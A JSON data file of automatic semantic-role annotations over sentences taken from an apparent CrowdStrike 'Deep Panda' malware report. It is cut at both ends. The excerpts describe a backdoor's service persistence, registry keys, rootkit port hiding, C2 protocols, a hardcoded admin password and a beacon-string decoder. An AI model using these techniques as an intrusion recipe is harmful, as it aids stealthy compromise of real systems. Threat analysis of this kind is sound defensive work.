filename"}}}, " One sample is typical of what is commonly referred to as a \u2018dropper\u2019 because its primary purpose is to write a malicious component to disk and connect it to the targeted hosts operating system": {"is": {"ARG1": {"text": "One sample"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "typical of what is commonly referred to as a \u2018 dropper \u2019 because its primary purpose is to write a malicious component to disk and connect it"}, "ARGM-CAU": {"text": "to the targeted hosts operating system"}}, "is_2": {"V": {"text": "is", "index": 6}}, "referred": {"ARG1": {"text": "what/ to"}, "ARGM-ADV": {"text": "commonly"}, "V": {"text": "referred", "index": 8}, "ARG2": {"text": "as a \u2018 dropper \u2019"}, "ARGM-CAU": {"text": "because its primary purpose is to write a malicious component to disk and connect it to the targeted hosts operating system"}}, "is_3": {"ARG1": {"text": "its primary purpose"}, "V": {"text": "is", "index": 19}, "ARG2": {"text": "to write a malicious component to disk and connect it to the targeted hosts operating system"}}, "write": {"V": {"text": "write", "index": 21}, "ARG1": {"text": "a malicious component to disk"}}, "disk": {"ARG0": {"text": "a malicious component"}, "V": {"text": "disk", "index": 26}, "ARG1": {"text": "the targeted hosts operating"}}, "connect": {"V": {"text": "connect", "index": 28}, "ARG1": {"text": "it"}, "ARG2": {"text": "to the targeted hosts operating system"}}, "targeted": {"V": {"text": "targeted", "index": 32}, "ARG1": {"text": "hosts operating system"}}, "operating": {"V": {"text": "operating", "index": 34}, "ARG0": {"text": "system"}}}, " The\nuser-mode component of this malware is a service called \u201cmsupdate\u201d, this driver is attempting to hide the\nservice": {"is": {"ARG1": {"text": "The user - mode component of this malware"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "a service called \u201c msupdate \u201d"}}, "called": {"ARG1": {"text": "a service"}, "V": {"text": "called", "index": 11}, "ARG2": {"text": "\u201c msupdate \u201d"}}, "is_2": {"V": {"text": "is", "index": 18}}, "attempting": {"ARG0": {"text": "this driver"}, "V": {"text": "attempting", "index": 19}, "ARG1": {"text": "to hide the service"}}, "hide": {"ARG0": {"text": "this driver"}, "V": {"text": "hide", "index": 21}, "ARG1": {"text": "the service"}}}, " The sample contains \u2018dead code\u2019 which appears to be\ncommand and control server classes, this is likely an indicator that the C2 client which would communicate\nwith this sample shares the same communications library which was compiled into this sample": {"contains": {"ARG0": {"text": "The sample"}, "V": {"text": "contains", "index": 2}, "ARG1": {"text": "\u2018 dead code \u2019 which appears to be command and control server classes"}}, "appears": {"ARG1": {"text": "\u2018"}, "V": {"text": "appears", "index": 8}, "C-ARG1": {"text": "to be command and control server classes"}}, "be": {"ARG1": {"text": "which"}, "V": {"text": "be", "index": 10}, "ARG2": {"text": "command and control server classes"}}, "is": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "likely an indicator that the C2 client which would communicate with this sample shares the same communications library which was compiled into this sample"}}, "would": {"V": {"text": "would", "index": 27}}, "communicate": {"ARG0": {"text": "the C2 client"}, "R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "communicate", "index": 28}, "ARG2": {"text": "with this sample shares the same communications library which was compiled into this sample"}}, "shares": {"ARG0": {"text": "the C2 client which would communicate with this sample"}, "V": {"text": "shares", "index": 32}, "ARG1": {"text": "the same communications library which was compiled into this sample"}}, "was": {"V": {"text": "was", "index": 38}}, "compiled": {"ARG1": {"text": "the same communications library"}, "R-ARG1": {"text": "which"}, "V": {"text": "compiled", "index": 39}, "ARG2": {"text": "into this"}}}, " This command results in the DLL deleting itself\nand terminating the backdoor process": {"results": {"ARG1": {"text": "This command"}, "V": {"text": "results", "index": 2}, "ARG2": {"text": "in the DLL deleting itself and terminating the backdoor process"}}, "terminating": {"V": {"text": "terminating", "index": 9}, "ARG1": {"text": "the backdoor process"}}}, " This kernel mode rootkit implements several\nhooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL": {"implements": {"ARG0": {"text": "This kernel mode rootkit"}, "V": {"text": "implements", "index": 4}, "ARG1": {"text": "several hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL"}}, "are": {"V": {"text": "are", "index": 9}}, "aimed": {"ARG1": {"text": "several hooking techniques"}, "R-ARG1": {"text": "that"}, "V": {"text": "aimed", "index": 10}, "ARG2": {"text": "at preventing a system administrator from detecting the backdoor DLL"}}, "preventing": {"V": {"text": "preventing", "index": 12}, "ARG1": {"text": "a system administrator"}, "ARG2": {"text": "from detecting the backdoor DLL"}}, "detecting": {"ARG0": {"text": "a system administrator"}, "V": {"text": "detecting", "index": 17}, "ARG1": {"text": "the backdoor DLL"}}}, " The sample first \nresolves several library functions provided by Microsoft using the LoadLibrary() and GetProcAddress()\nApplication Programming Interfaces (APIs)": {"resolves": {"ARG0": {"text": "The sample"}, "ARGM-TMP": {"text": "first"}, "V": {"text": "resolves", "index": 3}, "ARG1": {"text": "several library functions provided by Microsoft"}, "ARGM-MNR": {"text": "using the LoadLibrary ( )"}}, "provided": {"ARG1": {"text": "several library functions"}, "V": {"text": "provided", "index": 7}, "ARG0": {"text": "by Microsoft"}}, "using": {"ARG0": {"text": "several"}, "V": {"text": "using", "index": 10}, "ARG1": {"text": "the LoadLibrary ( )"}}}, " The sample utilizes the AES cryptographic algorithm to protect its C2\ncommunications": {"utilizes": {"ARG0": {"text": "The sample"}, "V": {"text": "utilizes", "index": 2}, "ARG1": {"text": "the AES cryptographic algorithm"}, "ARGM-PRP": {"text": "to protect its C2 communications"}}, "protect": {"V": {"text": "protect", "index": 8}, "ARG1": {"text": "its C2 communications"}}}, "\n</section>\n<section>\n<heading>Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)</heading>\n</section>\n\n<section>\n<heading>Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)</heading>\nThis sample is a sophisticated backdoor which implements several communications protocols and was\ndeveloped in C++": {"is": {"ARG1": {"text": "This sample"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a sophisticated backdoor which implements several communications protocols and was developed in C++"}}, "implements": {"ARG0": {"text": "a sophisticated backdoor"}, "R-ARG0": {"text": "which"}, "V": {"text": "implements", "index": 7}, "ARG1": {"text": "several communications protocols"}}, "was": {"V": {"text": "was", "index": 12}}, "developed": {"ARG1": {"text": "a sophisticated backdoor"}, "R-ARG1": {"text": "which"}, "V": {"text": "developed", "index": 13}, "ARGM-MNR": {"text": "in C++"}}}, " This driver attempts to hide a wide swath of TCP ports (40000-45000) for\nan unknown reason, however it is suspected that this may relate to the potential network relaying capability\nalluded to for the backdoor dll": {"attempts": {"ARG0": {"text": "This driver"}, "V": {"text": "attempts", "index": 2}, "ARG1": {"text": "to hide a wide swath of TCP ports ( 40000 - 45000 ) for an unknown reason"}}, "hide": {"ARG0": {"text": "This driver"}, "V": {"text": "hide", "index": 4}, "ARG1": {"text": "a wide swath of TCP ports ( 40000 - 45000 ) for an unknown reason"}}, "is": {"V": {"text": "is", "index": 23}}, "suspected": {"ARGM-DIS": {"text": "however"}, "V": {"text": "suspected", "index": 24}, "ARG1": {"text": "that this may relate to the potential network relaying capability alluded to for the backdoor dll"}}, "may": {"ARGM-MOD": {"text": "may"}, "C-ARG1": {"text": "relate"}}, "relate": {"ARG1": {"text": "this"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "relate", "index": 28}, "ARG2": {"text": "to the potential network relaying capability"}, "ARGM-ADV": {"text": "alluded to for the backdoor dll"}}, "relaying": {"V": {"text": "relaying", "index": 33}, "ARG1": {"text": "capability alluded"}, "ARGM-PRP": {"text": "for"}}, "alluded": {"ARG0": {"text": "the potential network relaying"}, "V": {"text": "alluded", "index": 35}, "ARG1": {"text": "to for the backdoor dll"}}}, " The third sample was a sophisticated implant that in addition to having multiple communication capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can hide aspects of the tool from user-mode tools": {"was": {"ARG1": {"text": "The third sample"}, "V": {"text": "was", "index": 3}, "ARG2": {"text": "a sophisticated implant that in addition to having multiple communication capabilities , and the ability to act as a relay for other infected hosts , utilized a kernel mode driver that can hide aspects of the tool from user - mode tools"}}, "having": {"V": {"text": "having", "index": 11}, "ARG1": {"text": "multiple communication capabilities"}}, "act": {"V": {"text": "act", "index": 20}, "ARG1": {"text": "as a relay for other infected hosts"}}, "utilized": {"ARG0": {"text": "the ability to act as a relay for other infected hosts"}, "V": {"text": "utilized", "index": 29}, "ARG1": {"text": "a kernel mode driver that can hide aspects of the tool from user - mode tools"}}, "can": {"V": {"text": "can", "index": 35}}, "hide": {"ARG0": {"text": "a kernel mode driver"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "hide", "index": 36}, "ARG1": {"text": "aspects of the tool from user - mode tools"}}}, " The tool has the\nability to automatically down select the most effective communication channel once it has been instantiated,\nwhich can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement": {"has": {"ARG0": {"text": "The tool"}, "V": {"text": "has", "index": 2}, "ARG1": {"text": "the ability to automatically down select the most effective communication channel once it has been instantiated , which can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement"}}, "select": {"ARG0": {"text": "The tool"}, "ARGM-MNR": {"text": "automatically"}, "V": {"text": "select", "index": 8}, "ARG1": {"text": "the most effective communication channel"}, "ARGM-TMP": {"text": "once it has been instantiated"}, "ARGM-ADV": {"text": "which can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement"}}, "has_2": {"V": {"text": "has", "index": 16}}, "been": {"ARG1": {"text": "it"}, "V": {"text": "been", "index": 17}, "ARG2": {"text": "instantiated"}}, "instantiated": {"ARG1": {"text": "it"}, "V": {"text": "instantiated", "index": 18}}, "can": {"ARG0": {"text": "the"}, "R-ARG0": {"text": "which"}, "V": {"text": "can", "index": 21}, "ARG1": {"text": "help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement"}}, "help": {"R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "help", "index": 22}, "ARG1": {"text": "avoid detection from solutions like DNS blacklisting and RFC protocol enforcement"}}, "avoid": {"ARG0": {"text": "which"}, "V": {"text": "avoid", "index": 23}, "ARG1": {"text": "detection from solutions like DNS blacklisting and RFC protocol enforcement"}}}, "\nThe malware sends and receives a heartbeat/keepalive packet every 2 minutes": {"sends": {"ARG0": {"text": "The malware"}, "V": {"text": "sends", "index": 2}}, "receives": {"ARG0": {"text": "The malware"}, "V": {"text": "receives", "index": 4}, "ARG1": {"text": "a heartbeat"}, "ARGM-TMP": {"text": "every 2 minutes"}}}, " It supports establishing TCP connections to other hosts\nand also listening for incoming connections": {"supports": {"ARG0": {"text": "It"}, "V": {"text": "supports", "index": 1}, "ARG1": {"text": "establishing TCP connections to other hosts"}}, "establishing": {"V": {"text": "establishing", "index": 2}, "ARG1": {"text": "TCP connections to other hosts"}}, "listening": {"ARG0": {"text": "It"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "listening", "index": 10}, "ARG1": {"text": "for incoming connections"}}}, "\n</section>\n<section>\n<heading>System Driver</heading>\nThe kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the\nCCRootkit package publicly by Steven Lai (a/k/a embedlinux)": {"dropped": {"ARG1": {"text": "The kernel driver component"}, "V": {"text": "dropped", "index": 4}, "ARG2": {"text": "by the Backdoor"}}, "bears": {"ARG0": {"text": "The kernel driver component dropped by the Backdoor DLL"}, "V": {"text": "bears", "index": 9}, "ARG1": {"text": "many tool marks associating it"}, "ARG2": {"text": "with the CCRootkit package publicly by Steven Lai ( a / k / a embedlinux )"}}, "associating": {"V": {"text": "associating", "index": 13}, "ARG1": {"text": "it"}, "ARG2": {"text": "with the CCRootkit package"}, "ARGM-MNR": {"text": "publicly"}, "ARG0": {"text": "by Steven Lai ( a / k / a embedlinux )"}}}, " During installation, the sample attempts to use documented APIs such as\nOpenSCManager() and CreateService() to initialize itself as a persistent Windows service": {"attempts": {"ARGM-TMP": {"text": "During installation"}, "ARG0": {"text": "the sample"}, "V": {"text": "attempts", "index": 5}, "ARG1": {"text": "to use documented APIs such as OpenSCManager ( )"}}, "use": {"ARG0": {"text": "the sample"}, "V": {"text": "use", "index": 7}, "ARG1": {"text": "documented APIs such as OpenSCManager ( )"}}, "documented": {"V": {"text": "documented", "index": 8}, "ARG1": {"text": "APIs such"}}, "initialize": {"V": {"text": "initialize", "index": 20}, "ARG1": {"text": "itself"}, "ARG2": {"text": "as a persistent Windows service"}}}, " This is meant to \nprevent identification during disk forensics using a common investigative technique called a forensic \nanalysis timeline": {"is": {"V": {"text": "is", "index": 1}}, "meant": {"V": {"text": "meant", "index": 2}, "ARG1": {"text": "to prevent identification during disk forensics using a common investigative technique called a forensic analysis timeline"}}, "prevent": {"ARG0": {"text": "This"}, "V": {"text": "prevent", "index": 4}, "ARG1": {"text": "identification"}, "ARGM-TMP": {"text": "during disk forensics"}, "ARGM-MNR": {"text": "using a common investigative technique called a forensic analysis timeline"}}, "using": {"V": {"text": "using", "index": 9}, "ARG1": {"text": "a common investigative technique called a forensic analysis timeline"}}, "called": {"ARG1": {"text": "a common investigative technique"}, "V": {"text": "called", "index": 14}, "ARG2": {"text": "a forensic analysis timeline"}}}, "\n\nThe next key to be changed is:\nHKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost, which will have\nthe \u2018msupdate\u2019 key set to \u2018msupdate\u2019": {"be": {"V": {"text": "be", "index": 4}}, "changed": {"ARG1": {"text": "The next key"}, "V": {"text": "changed", "index": 5}}, "is": {"ARG1": {"text": "The next key to be changed"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost , which will have the \u2018 msupdate \u2019 key set to \u2018 msupdate \u2019"}}, "will": {"V": {"text": "will", "index": 12}}, "have": {"ARG0": {"text": "NT\\\\CurrentVersion\\\\Svchost"}, "R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "have", "index": 13}, "ARG1": {"text": "the \u2018 msupdate \u2019 key set to \u2018 msupdate \u2019"}}}, "\n\n\nThis demonstrates an attempt to use the most efficient communication channel first, falling back to more  \nlegitimate appearing channels as required in order to appear Request For Comment (RFC) compliant with\nthe HTTP protocol": {"demonstrates": {"ARG0": {"text": "This"}, "V": {"text": "demonstrates", "index": 1}, "ARG1": {"text": "an attempt to use the most efficient communication channel first , falling back to more legitimate appearing channels as required in order to appear Request For Comment ( RFC ) compliant with the HTTP protocol"}}, "use": {"V": {"text": "use", "index": 5}, "ARG1": {"text": "the most efficient communication channel"}, "ARGM-TMP": {"text": "first"}, "ARGM-PRD": {"text": "falling back to more legitimate appearing channels"}}, "falling": {"V": {"text": "falling", "index": 13}, "ARG4": {"text": "back to more legitimate appearing channels as required"}, "ARGM-PRP": {"text": "in order to appear Request For Comment ( RFC ) compliant with the HTTP protocol"}}, "appearing": {"V": {"text": "appearing", "index": 18}, "ARG1": {"text": "channels"}}, "required": {"V": {"text": "required", "index": 21}}, "appear": {"V": {"text": "appear", "index": 25}, "ARG1": {"text": "Request For Comment ( RFC ) compliant with the HTTP protocol"}}}, " This class also\nprovides the ability for the attacker to take a screen shot of the users desktop": {"provides": {"ARG0": {"text": "This class"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "provides", "index": 3}, "ARG1": {"text": "the ability for the attacker to take a screen shot of the users desktop"}}, "take": {"ARG0": {"text": "the attacker"}, "V": {"text": "take", "index": 10}, "ARG1": {"text": "a screen shot of the users desktop"}}}, " The command line options support post exploitation capabilities such as changing \nfile timestamps, forensic mitigation, privilege escalation, launching the executable, and specifying a specific\nC2": {"support": {"ARGM-ADJ": {"text": "command line"}, "ARG1": {"text": "options"}, "V": {"text": "support", "index": 4}}, "changing": {"V": {"text": "changing", "index": 10}, "ARG1": {"text": "file timestamps , forensic mitigation , privilege escalation"}}, "launching": {"V": {"text": "launching", "index": 20}, "ARG1": {"text": "the executable"}}, "specifying": {"V": {"text": "specifying", "index": 25}, "ARG1": {"text": "a specific C2"}}}, " This is particularly relevant in this case because the backdoor DLL sample with an MD5\n of de7500fc1065a081180841f32f06a537 specifically avoids installing the kernel driver on a system running \n this tool": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "particularly relevant"}, "ARGM-LOC": {"text": "in this case"}, "ARGM-CAU": {"text": "because the backdoor DLL sample with an MD5 of de7500fc1065a081180841f32f06a537 specifically avoids installing the kernel driver on a system running this tool"}}, "avoids": {"ARG0": {"text": "the backdoor DLL sample with an MD5 of de7500fc1065a081180841f32f06a537"}, "ARGM-ADV": {"text": "specifically"}, "V": {"text": "avoids", "index": 18}, "ARG1": {"text": "installing the kernel driver on a system running this tool"}}, "installing": {"ARGM-MNR": {"text": "specifically avoids"}, "V": {"text": "installing", "index": 19}, "ARG1": {"text": "the kernel driver"}, "ARG2": {"text": "on a system"}}, "running": {"ARG0": {"text": "a system"}, "V": {"text": "running", "index": 26}, "ARG1": {"text": "this tool"}}}, "\nExamples of implemented commands include download and upload files, installing new .NET assemblies,\ncalling methods on those assemblies, connecting to new C2 servers and executing processes": {"implemented": {"V": {"text": "implemented", "index": 2}, "ARG1": {"text": "commands"}}, "include": {"ARG2": {"text": "Examples of implemented commands"}, "V": {"text": "include", "index": 4}, "ARG1": {"text": "download and upload files , installing new .NET assemblies ,"}, "ARGM-PRD": {"text": "calling methods on those assemblies , connecting to new C2 servers and executing processes"}}, "upload": {"V": {"text": "upload", "index": 7}, "ARG0": {"text": "files"}}, "installing": {"V": {"text": "installing", "index": 10}, "ARG1": {"text": "new .NET assemblies"}}, "calling": {"V": {"text": "calling", "index": 15}, "ARG1": {"text": "methods"}, "ARG2": {"text": "on those assemblies"}}, "connecting": {"V": {"text": "connecting", "index": 21}, "ARG2": {"text": "to new C2 servers and executing processes"}}}, " This hook also filters \nany connections listening on TCP ports in the range between 40000 and 45000": {"filters": {"ARG0": {"text": "This hook"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "filters", "index": 3}, "ARG1": {"text": "any connections listening on TCP ports in the range between 40000 and 45000"}}, "listening": {"ARG0": {"text": "any connections"}, "V": {"text": "listening", "index": 6}, "ARG1": {"text": "on TCP ports in the range between 40000 and 45000"}}}, " If the event already \nexists, the driver fails to load, presumably to avoid a\n\n<footer>\nCROWDSTRIKE                                                                      S E N S I T I VE         14\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nmultiple instances of itself": {"exists": {"ARG1": {"text": "the event"}, "ARGM-TMP": {"text": "already"}, "V": {"text": "exists", "index": 4}}, "fails": {"ARGM-ADV": {"text": "If the event already exists"}, "ARG1": {"text": "the driver"}, "V": {"text": "fails", "index": 8}, "ARG2": {"text": "to load"}, "ARGM-PRP": {"text": "presumably to avoid a multiple instances of itself"}}, "load": {"ARG0": {"text": "the driver"}, "V": {"text": "load", "index": 10}}, "avoid": {"ARG0": {"text": "the driver"}, "ARGM-ADV": {"text": "presumably"}, "V": {"text": "avoid", "index": 14}, "ARG1": {"text": "a multiple instances of itself"}}}, " If the event does not exist, the driver then creates it using the Windows API\nZwCreateEvent()": {"does": {"V": {"text": "does", "index": 3}}, "exist": {"ARG1": {"text": "the event"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "exist", "index": 5}}, "creates": {"ARGM-ADV": {"text": "If the event does not exist"}, "ARG0": {"text": "the driver"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "creates", "index": 10}, "ARG1": {"text": "it"}, "ARGM-MNR": {"text": "using the Windows API ZwCreateEvent ( )"}}, "using": {"V": {"text": "using", "index": 12}, "ARG1": {"text": "the Windows API ZwCreateEvent ( )"}}}, " Barring\nthe two aforementioned conditions, the sample decrypts the kernel driver to:\n<list>\n        \u201c%sysdir%\\Drivers\\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys\u201d\n</list>\nFollowing the decryption and writing of the driver to disk, it is loaded using the ZwLoadDriver() API": {"Barring": {"V": {"text": "Barring", "index": 0}, "ARG1": {"text": "the two aforementioned conditions"}}, "decrypts": {"ARG0": {"text": "the sample"}, "V": {"text": "decrypts", "index": 8}, "ARG1": {"text": "the kernel driver"}, "ARGM-DIR": {"text": "to"}}, "Following": {"V": {"text": "Following", "index": 14}, "ARG2": {"text": "the decryption and writing of the driver to disk"}}, "disk": {"ARG0": {"text": "the driver"}, "V": {"text": "disk", "index": 23}}, "is": {"V": {"text": "is", "index": 26}}, "loaded": {"ARGM-TMP": {"text": "Following the decryption and writing of the driver to disk"}, "ARG1": {"text": "it"}, "V": {"text": "loaded", "index": 27}, "ARG2": {"text": "using the ZwLoadDriver ( ) API"}}, "using": {"V": {"text": "using", "index": 28}, "ARG1": {"text": "the ZwLoadDriver"}}}, "\n\nAfter sending the initial authentication packet, the sample verifies that the first four bytes of the response is \nequal to a statically defined value, in this sample the value is: 0x16030100": {"sending": {"V": {"text": "sending", "index": 1}, "ARG1": {"text": "the initial authentication packet"}}, "verifies": {"ARGM-TMP": {"text": "After sending the initial authentication packet"}, "ARG0": {"text": "the sample"}, "V": {"text": "verifies", "index": 9}, "ARG1": {"text": "that the first four bytes of the response is equal to a statically defined value"}}, "is": {"ARG1": {"text": "the first four bytes of the response"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "equal to a statically defined value"}}, "defined": {"ARGM-MNR": {"text": "statically"}, "V": {"text": "defined", "index": 23}, "ARG1": {"text": "value"}}, "is_2": {"ARGM-LOC": {"text": "in this sample"}, "ARG1": {"text": "the value"}, "V": {"text": "is", "index": 31}, "ARG2": {"text": "0x16030100"}}}, " This allows any user to have complete control \nover the machine, as rundll32.exe is frequently launched by tasks such as changing the time, wallpaper,\nor other system settings": {"allows": {"ARG0": {"text": "This"}, "V": {"text": "allows", "index": 1}, "ARG1": {"text": "any user to have complete control over the machine/ system settings"}, "ARGM-ADV": {"text": "as rundll32.exe is frequently launched by tasks such as changing the time , wallpaper , or other"}}, "have": {"ARG0": {"text": "any user"}, "V": {"text": "have", "index": 5}, "ARG1": {"text": "complete control over the machine"}}, "is": {"V": {"text": "is", "index": 14}}, "launched": {"ARG1": {"text": "rundll32.exe"}, "ARGM-TMP": {"text": "frequently"}, "V": {"text": "launched", "index": 16}, "ARG0": {"text": "by tasks such as changing the time , wallpaper , or other system settings"}}, "changing": {"V": {"text": "changing", "index": 21}, "ARG1": {"text": "the time , wallpaper , or other system settings"}}}, " The registry change creates the following key:\n<list>\nHKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\msupdate\\\\Parameters\n</list>\nFollowing this, the subroutine will set the value of the \u2018ServiceDLL\u2019 to the module handle of the DLL": {"creates": {"ARG0": {"text": "The registry change"}, "V": {"text": "creates", "index": 3}, "ARG1": {"text": "the following key"}}, "following": {"V": {"text": "following", "index": 5}, "ARG1": {"text": "key"}}, "Following": {"V": {"text": "Following", "index": 8}, "ARG1": {"text": "this"}}, "will": {"V": {"text": "will", "index": 13}}, "set": {"ARGM-TMP": {"text": "Following this"}, "ARG0": {"text": "the subroutine"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "set", "index": 14}, "ARG1": {"text": "the value of the \u2018 ServiceDLL \u2019 to the module handle of the DLL"}}}, "\n\n\n<footer>\n\nCROWDSTRIKE                                                                             S E N S I T I VE           7\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nWhen command 0x23000004 is received, a temporary new user \u201c_DomainUser_\u201d with password \u201cDom4!nU-\nserP4ss\u201d is created and added to the local Administrators group": {"is": {"V": {"text": "is", "index": 3}}, "received": {"ARG1": {"text": "command 0x23000004"}, "V": {"text": "received", "index": 4}}, "is_2": {"V": {"text": "is", "index": 21}}, "created": {"ARGM-TMP": {"text": "When command 0x23000004 is received"}, "ARG1": {"text": "a temporary new user \u201c _ DomainUser _ \u201d with password \u201c Dom4!nU- serP4ss \u201d"}, "V": {"text": "created", "index": 22}}, "added": {"ARGM-TMP": {"text": "When command 0x23000004 is received"}, "ARG1": {"text": "a temporary new user \u201c _ DomainUser _ \u201d with password \u201c Dom4!nU- serP4ss \u201d"}, "V": {"text": "added", "index": 24}, "ARG2": {"text": "to the local Administrators group"}}}, "\n\nThe malicious sample sends an initial beacon to the C2 that includes the following information:\n<list>\n       \udbc0\udd94 The computer name as obtained with the GetComputerName() API\n       \udbc0\udd94 The username of the current Remote Desktop session if currently being executed in a Remote\n          Desktop session or \u201cnone\u201d otherwise": {"sends": {"ARG0": {"text": "The malicious sample"}, "V": {"text": "sends", "index": 3}, "ARG1": {"text": "an initial beacon"}, "ARG2": {"text": "to the C2 that includes the following information"}, "C-ARG1": {"text": "\udbc0\udd94 The computer name as obtained with the GetComputerName ( ) API \udbc0\udd94 The username of the current Remote Desktop session if currently being executed in a Remote Desktop session or \u201c none \u201d"}}, "includes": {"ARG2": {"text": "the C2"}, "R-ARG2": {"text": "that"}, "V": {"text": "includes", "index": 11}, "ARG1": {"text": "the following information"}}, "following": {"V": {"text": "following", "index": 13}, "ARG1": {"text": "information"}}, "\udbc0\udd94": {"V": {"text": "\udbc0\udd94", "index": 16}, "ARG1": {"text": "The computer name"}, "ARG2": {"text": "as obtained with the GetComputerName"}}, "obtained": {"V": {"text": "obtained", "index": 21}, "ARG2": {"text": "with the GetComputerName ( ) API"}}, "being": {"V": {"text": "being", "index": 39}}, "executed": {"ARGM-TMP": {"text": "currently"}, "V": {"text": "executed", "index": 40}, "ARGM-LOC": {"text": "in a Remote Desktop session"}}}, " This remote control functionality is implemented as separate messages\nfor mouse clicks, pressed keys, etc": {"is": {"V": {"text": "is", "index": 4}}, "implemented": {"ARG1": {"text": "This remote control functionality"}, "V": {"text": "implemented", "index": 5}, "ARGM-PRD": {"text": "as separate messages for"}, "ARG2": {"text": "mouse clicks , pressed keys , etc"}}}, " If the installation fails, the sample\nspawns a new process using rundll32.exe, this executable will instantiate the DLL and can call a specific \nexported function": {"fails": {"ARG1": {"text": "the installation"}, "V": {"text": "fails", "index": 3}}, "spawns": {"ARGM-ADV": {"text": "If the installation fails"}, "ARG0": {"text": "the sample"}, "V": {"text": "spawns", "index": 7}, "ARG1": {"text": "a new process"}, "ARGM-MNR": {"text": "using rundll32.exe"}}, "using": {"ARG0": {"text": "a new process"}, "V": {"text": "using", "index": 11}, "ARG1": {"text": "rundll32.exe"}}, "will": {"ARGM-ADV": {"text": "If the installation fails"}, "ARG0": {"text": "this executable"}, "V": {"text": "will", "index": 16}, "ARG1": {"text": "instantiate the DLL"}}, "instantiate": {"ARGM-ADV": {"text": "If the installation fails"}, "ARG0": {"text": "this executable"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "instantiate", "index": 17}, "ARG1": {"text": "the DLL"}}, "can": {"ARGM-MOD": {"text": "will"}, "V": {"text": "can", "index": 21}}, "call": {"ARGM-ADV": {"text": "If the installation fails"}, "ARG0": {"text": "this executable"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "call", "index": 22}, "ARG1": {"text": "a specific exported function"}}, "exported": {"V": {"text": "exported", "index": 25}, "ARG1": {"text": "function"}}}, "\n</section>\n\n<section>\n<heading>C2 Communication Mechanisms</heading>\nThe malware has three distinct C2 protocols two of which can be transmitted over HTTP proxies and one\ncan be bundled in two different \u2018dual\u2019 modes (see 3.), totaling 7 distinct supported C2 mechanisms": {"has": {"ARG0": {"text": "The malware"}, "V": {"text": "has", "index": 2}, "ARG1": {"text": "three distinct C2 protocols two of which can be transmitted over HTTP proxies and one can be bundled in two different \u2018 dual \u2019 modes ( see 3 . ) , totaling 7 distinct supported C2 mechanisms"}}, "can": {"V": {"text": "can", "index": 10}}, "be": {"V": {"text": "be", "index": 11}}, "transmitted": {"R-ARG1": {"text": "three distinct C2 protocols/ two of which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "transmitted", "index": 12}, "ARG1": {"text": "over HTTP proxies"}}, "can_2": {"V": {"text": "can", "index": 18}}, "be_2": {"ARG1": {"text": "one"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 19}, "ARG2": {"text": "bundled"}}, "bundled": {"ARG1": {"text": "one"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "bundled", "index": 20}, "ARG2": {"text": "in two different \u2018 dual \u2019 modes ( see 3 . ) , totaling 7 distinct supported C2 mechanisms"}}, "see": {"V": {"text": "see", "index": 29}, "ARG1": {"text": "3"}}, "totaling": {"ARG1": {"text": "3"}, "V": {"text": "totaling", "index": 34}, "ARG2": {"text": "7 distinct supported C2 mechanisms"}}, "supported": {"ARG0": {"text": "totaling 7 distinct"}, "V": {"text": "supported", "index": 37}, "ARG1": {"text": "C2 mechanisms"}}}, " If no arguments are given, a connection to the C2 is initiated to the stati-\ncally defined IP address": {"are": {"V": {"text": "are", "index": 3}}, "given": {"ARG1": {"text": "no arguments"}, "V": {"text": "given", "index": 4}}, "is": {"V": {"text": "is", "index": 11}}, "initiated": {"ARGM-ADV": {"text": "If no arguments are given"}, "ARG1": {"text": "a connection to the C2"}, "V": {"text": "initiated", "index": 12}, "ARG0": {"text": "to the stati- cally defined"}}, "defined": {"V": {"text": "defined", "index": 17}, "ARG1": {"text": "IP address"}}}, "\n\n\nThe following python function can be used to decode the beacon stings:\n<code>\n def decode(crypted):\n decoded=\u201d\u201d\n   for x in crypted:\n     decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)\n   return decoded\n</code>\n\n\n<footer>\nCROWDSTRIKE                                                                          S E N S I T I VE            6\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nAfter sending the initial beacon, the routine loops receiving incoming commands and executes them in\nsequence": {"following": {"V": {"text": "following", "index": 1}, "ARG1": {"text": "python function"}}, "can": {"V": {"text": "can", "index": 4}}, "be": {"V": {"text": 